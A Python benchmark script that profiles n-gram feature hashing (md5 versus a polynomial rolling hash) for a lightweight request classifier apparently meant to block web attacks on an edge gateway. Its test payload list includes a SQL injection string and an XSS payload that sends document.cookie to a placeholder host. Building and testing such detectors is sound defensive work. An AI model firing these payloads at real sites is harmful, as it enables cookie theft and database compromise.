"""Pure-Python n-gram micro-inferencer profiled on the Edge gateway.

Compares md5 hashing against a polynomial rolling hash for the n-gram bucketing,
since md5 per n-gram is the obvious latency risk on ARM.
"""
import hashlib
import json
import math
import os
import resource
import time

NGRAM_N, NGRAM_D = 3, 256
NORM = [100.0, 20.0, 5.0]


def syntactic(p):
    n = len(p)
    special = sum(1 for c in p if not c.isalnum())
    if n:
        prob = [float(p.count(c)) / n for c in dict.fromkeys(p)]
        ent = -sum(q * math.log(q, 2) for q in prob)
    else:
        ent = 0.0
    return [n / NORM[0], special / NORM[1], ent / NORM[2]]


def ngram_md5(p, d=NGRAM_D, n=NGRAM_N):
    v = [0.0] * d
    s = p.lower()
    for i in range(len(s) - n + 1):
        v[int(hashlib.md5(s[i:i + n].encode()).hexdigest()[:8], 16) % d] += 1.0
    nrm = math.sqrt(sum(x * x for x in v)) or 1.0
    return [x / nrm for x in v]


def ngram_poly(p, d=NGRAM_D, n=NGRAM_N):
    """Polynomial rolling hash -- no crypto, no allocation per n-gram."""
    v = [0.0] * d
    s = p.lower()
    b = s.encode("utf-8", "ignore")
    for i in range(len(b) - n + 1):
        h = 0
        for j in range(i, i + n):
            h = (h * 131 + b[j]) & 0xFFFFFFFF
        v[h % d] += 1.0
    nrm = math.sqrt(sum(x * x for x in v)) or 1.0
    return [x / nrm for x in v]


def bench(label, feat, payloads, coef, intercept):
    feat(payloads[0])                                    # warm up
    start = time.perf_counter()
    blocked = 0
    for p in payloads:
        f = feat(p)
        score = sum(a * b for a, b in zip(f, coef)) + intercept
        if score >= 0:
            blocked += 1
    total = time.perf_counter() - start
    print(f"  {label:<22} {total:>7.3f} s   {total / len(payloads) * 1000:>7.4f} ms/req"
          f"   blocked {blocked}/{len(payloads)}")
    return total / len(payloads) * 1000


if __name__ == "__main__":
    print(f"[+] n-gram micro-inferencer on {os.uname().machine}, D={NGRAM_D}, n={NGRAM_N}")
    dim = NGRAM_D + 3
    coef = [0.01] * dim
    intercept = -0.5

    payloads = [
        "GET /search?q=api/v1/resource?id=123",
        "GET /search?q=admin' OR '1'='1 UNION SELECT password FROM users--",
        "GET /search?q=<script>fetch('http://x/?c='+document.cookie)</script>",
        "GET /search?q=images/logo.png",
    ] * 2500

    print(f"\n  {len(payloads)} requests, {dim}-dimensional feature vector")
    t_md5 = bench("md5 n-grams", lambda p: ngram_md5(p) + syntactic(p),
                  payloads, coef, intercept)
    t_poly = bench("polynomial n-grams", lambda p: ngram_poly(p) + syntactic(p),
                   payloads, coef, intercept)
    t_syn = bench("syntactic only (3)", syntactic, payloads, coef[:3], intercept)

    usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    ram = usage / (1024 * 1024) if os.uname().sysname == "Darwin" else usage / 1024
    print(f"\n  Peak RSS: {ram:.2f} MB")
    print(f"  Update size: {(dim + 1) * 4} bytes ({dim} coefficients + 1 intercept, float32)")
    print(f"\n  md5 vs syntactic  : {t_md5 / t_syn:.1f}x slower")
    print(f"  poly vs syntactic : {t_poly / t_syn:.1f}x slower")
